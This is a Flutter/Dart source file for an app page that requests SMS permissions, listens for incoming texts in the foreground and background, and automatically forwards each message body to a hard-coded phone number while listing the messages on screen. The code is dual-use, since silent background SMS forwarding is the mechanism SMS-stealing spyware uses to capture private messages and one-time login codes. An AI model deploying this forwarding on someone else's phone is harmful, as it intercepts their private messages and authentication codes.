import 'dart:developer';

import 'package:flutter/material.dart';
import 'package:telephony/telephony.dart';

class SmsListenerPage extends StatefulWidget {
  const SmsListenerPage({super.key});

  @override
  SmsListenerPageState createState() => SmsListenerPageState();
}

class SmsListenerPageState extends State<SmsListenerPage> {
  static final Telephony telephony = Telephony.instance;
  // final _formKey = GlobalKey<FormState>();
  // final TextEditingController _mobileController = TextEditingController();
  // static var globalforwardNumber = "";
  final List<String> _receivedSms = [];

  @override
  void initState() {
    super.initState();
    requestPermissions();
    // Request permissions
  }

  void requestPermissions() async {
    bool? isGranted = await telephony.requestPhoneAndSmsPermissions;
    if (isGranted ?? false) {
      log("Permissions granted");
      startListeningForSms();
    } else {
      log("Permissions denied");
      setState(() {
        _receivedSms.add("SMS permission denied");
      });
    }
  }

  void startListeningForSms() {
    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) {
        log("Received SMS: ${message.body}");
        _forwardSms(message);
        setState(() {
          _receivedSms
              .add("From: ${message.address}\nMessage: ${message.body}");
        });
      },
      listenInBackground: true,
      onBackgroundMessage: _backgroundMessageHandler,
    );
  }

  static void _backgroundMessageHandler(SmsMessage message) {
    log("Background SMS received: ${message.body}");
    _forwardSms(message);
  }

  static void _forwardSms(SmsMessage message) async {
    String forwardNumber =
        '9825929787'; // Replace this with the actual number you want to forward SMS to
    // Send the message to the forward number
    await telephony.sendSms(
      to: forwardNumber,
      message: 'Forwarded: ${message.body}',
    );
    log('SMS forwarded: ${message.body}');
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("Mobile Form")),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: listView(context),
      ),
    );
  }
  // @override
  // Widget build(BuildContext context) {
  //   return Scaffold(
  //     appBar: AppBar(title: const Text("Mobile Form")),
  //     body: Padding(
  //       padding: const EdgeInsets.all(16.0),
  //       child: Form(
  //         key: _formKey,
  //         child: Column(
  //           crossAxisAlignment: CrossAxisAlignment.start,
  //           children: [
  //             // Mobile Number Field
  //             TextFormField(
  //               controller: _mobileController,
  //               decoration: const InputDecoration(
  //                 labelText: "Mobile Number",
  //                 hintText: "Enter your mobile number",
  //                 border: OutlineInputBorder(),
  //               ),
  //               keyboardType: TextInputType.phone,
  //               validator: (value) {
  //                 if (value == null || value.isEmpty) {
  //                   return 'Please enter your mobile number';
  //                 } else if (!RegExp(r'^\d{10}$').hasMatch(value)) {
  //                   return 'Enter a valid 10-digit mobile number';
  //                 }
  //                 return null;
  //               },
  //             ),
  //             const SizedBox(height: 16.0),

  //             // Submit Button
  //             ElevatedButton(
  //               onPressed: () {
  //                 if (_formKey.currentState!.validate()) {
  //                   // If the form is valid, show a success message
  //                   globalforwardNumber = _mobileController.text;
  //                   requestPermissions();
  //                 }
  //               },
  //               child: const Text("Submit"),
  //             ),
  //           ],
  //         ),
  //       ),
  //     ),
  //   );
  // }

  Widget listView(BuildContext context) {
    return ListView.builder(
      itemCount: _receivedSms.length,
      itemBuilder: (context, index) {
        return Card(
          child: ListTile(
            title: Text(_receivedSms[index]),
          ),
        );
      },
    );
  }
}
